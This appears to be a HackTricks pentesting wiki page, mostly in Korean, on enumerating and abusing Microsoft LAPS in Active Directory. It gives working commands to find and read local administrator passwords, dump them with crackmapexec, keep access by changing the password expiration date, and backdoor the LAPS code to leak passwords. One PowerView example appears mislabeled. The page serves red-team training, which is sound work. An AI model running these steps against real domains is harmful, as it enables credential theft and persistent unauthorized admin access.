# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basic Information

로컬 관리자 비밀번호 솔루션(Local Administrator Password Solution, LAPS)은 **고유하고 무작위이며 자주 변경되는** **관리자 비밀번호**를 도메인에 가입된 컴퓨터에 적용하기 위해 사용되는 도구입니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, Access Control Lists (ACLs)를 통해 권한이 부여된 사용자만 접근할 수 있습니다. 클라이언트에서 서버로의 비밀번호 전송 보안은 **Kerberos 버전 5**와 **고급 암호화 표준(Advanced Encryption Standard, AES)**를 사용하여 보장됩니다.

도메인의 컴퓨터 객체에서 LAPS의 구현은 두 개의 새로운 속성인 **`ms-mcs-AdmPwd`**와 **`ms-mcs-AdmPwdExpirationTime`**의 추가로 이어집니다. 이 속성들은 각각 **평문 관리자 비밀번호**와 **만료 시간**을 저장합니다.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS 비밀번호 접근

당신은 **원시 LAPS 정책을 다운로드할 수 있습니다** `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` 그리고 **`Parse-PolFile`**를 사용하여 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지에서 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.

게다가, **네이티브 LAPS PowerShell cmdlets**는 우리가 접근할 수 있는 머신에 설치되어 있다면 사용할 수 있습니다:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView**는 **누가 비밀번호를 읽을 수 있는지와 그것을 읽는지** 알아내는 데에도 사용될 수 있습니다:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)는 여러 기능을 통해 LAPS의 열거를 용이하게 합니다.\
하나는 **LAPS가 활성화된 모든 컴퓨터에 대한 `ExtendedRights`**를 파싱하는 것입니다. 이는 **LAPS 비밀번호를 읽도록 특별히 위임된 그룹**을 보여주며, 이러한 그룹은 종종 보호된 그룹의 사용자입니다.\
**도메인에 컴퓨터를 가입시킨 계정**은 해당 호스트에 대한 `All Extended Rights`를 받으며, 이 권한은 **계정**이 **비밀번호를 읽을 수 있는** 능력을 부여합니다. 열거를 통해 호스트에서 LAPS 비밀번호를 읽을 수 있는 사용자 계정을 보여줄 수 있습니다. 이는 LAPS 비밀번호를 읽을 수 있는 **특정 AD 사용자**를 **타겟팅하는 데** 도움이 될 수 있습니다.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
PowerShell에 접근할 수 없는 경우 LDAP를 통해 이 권한을 원격으로 악용할 수 있습니다.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
이것은 사용자가 읽을 수 있는 모든 비밀번호를 덤프하여 다른 사용자로 더 나은 발판을 마련할 수 있게 합니다.

## **LAPS 지속성**

### **만료 날짜**

관리자가 되면, **비밀번호를 얻고** **비밀번호 업데이트를 방지**하기 위해 **만료 날짜를 미래로 설정**하는 것이 가능합니다.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
비밀번호는 **admin**이 **`Reset-AdmPwdPassword`** cmdlet을 사용할 경우 여전히 재설정됩니다. 또는 LAPS GPO에서 **정책에 의해 요구되는 것보다 긴 비밀번호 만료 시간을 허용하지 않음**이 활성화된 경우에도 마찬가지입니다.
{% endhint %}

### 백도어

LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으며, 따라서 **새 비밀번호를 유출하거나 어딘가에 저장하는** 백도어를 코드에 삽입할 수 있습니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부).

그런 다음, 새로운 `AdmPwd.PS.dll`을 컴파일하고 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드합니다 (그리고 수정 시간을 변경합니다).

## 참고문헌
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS 해킹 배우고 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우고 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
